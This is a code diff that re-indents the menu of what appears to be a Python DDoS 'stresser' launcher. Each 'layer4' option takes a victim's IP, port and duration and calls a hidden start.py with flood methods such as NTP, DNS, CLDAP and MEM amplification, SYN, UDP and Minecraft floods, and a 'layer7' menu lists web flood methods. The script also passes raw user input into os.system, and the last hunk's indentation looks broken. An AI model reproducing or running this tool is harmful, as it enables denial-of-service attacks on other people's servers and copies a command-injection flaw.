@@ -56,116 +56,116 @@ if input1 == "layer4":
 ║                                                       ║
 ╚═══════════════════════════════════════════════════════╝""")
     
-layer4input = input("""
+    layer4input = input("""
 ╔══════[root@watermelon]
 ╚═══> """)
-if layer4input == "MINECRAFT":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py MINECRAFT " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "MINECRAFT":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py MINECRAFT " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "CLDAP":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py CLDAP " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "CLDAP":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py CLDAP " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "VSE":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py VSE " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "VSE":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py VSE " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "MCPE":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py MCPE " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "MCPE":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py MCPE " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "NTP":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py NTP " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "NTP":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py NTP " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "FIVEM":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py FIVEM " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "FIVEM":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py FIVEM " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "ARD":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py ARD " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "ARD":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py ARD " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "MEM":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py MEM " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "MEM":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py MEM " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "DNS":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py DNS " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "DNS":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py DNS " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "UDP":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py UDP " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "UDP":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py UDP " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "SYN":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py SYN " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "SYN":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py SYN " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "CONNECTION":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py CONNECTION " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "CONNECTION":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py CONNECTION " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "RDP":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py RDP " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "RDP":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py RDP " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "TCP":
-    iptcp = input(f"ip ══ ")
-    porttcp = input(f"port ══ ")
-    timeudptcp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py TCP " + iptcp + ":" + porttcp + " 1000 " + timeudptcp)
+    if layer4input == "TCP":
+        iptcp = input(f"ip ══ ")
+        porttcp = input(f"port ══ ")
+        timeudptcp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py TCP " + iptcp + ":" + porttcp + " 1000 " + timeudptcp)
 
-if layer4input == "TS3":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py TS3 " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "TS3":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py TS3 " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "MCBOT":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py MCBOT " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "MCBOT":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py MCBOT " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "CPS":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py CPS " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "CPS":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py CPS " + ip + ":" + port + " 1000 " + timeudp)
 
-if layer4input == "CHAR":
-    ip = input(f"ip ══ ")
-    port = input(f"port ══ ")
-    timeudp = input(f"timeudp ══ ")
-    os.system("cd files/dont_look && python3 start.py CHAR " + ip + ":" + port + " 1000 " + timeudp)
+    if layer4input == "CHAR":
+        ip = input(f"ip ══ ")
+        port = input(f"port ══ ")
+        timeudp = input(f"timeudp ══ ")
+        os.system("cd files/dont_look && python3 start.py CHAR " + ip + ":" + port + " 1000 " + timeudp)
 
 #layer7
 if input1 == "layer7":
@@ -178,7 +178,8 @@ if input1 == "layer7":
 ║  OVH, AVB, POST, XMLRPC, GET, CFBUAM, BOT, STRESS, GSB║                                            
 ║                                                       ║
 ╚═══════════════════════════════════════════════════════╝""")
-layer7input = input("""
+      
+       layer7input = input("""
 ╔══════[root@watermelon]
 ╚═══> """)
 
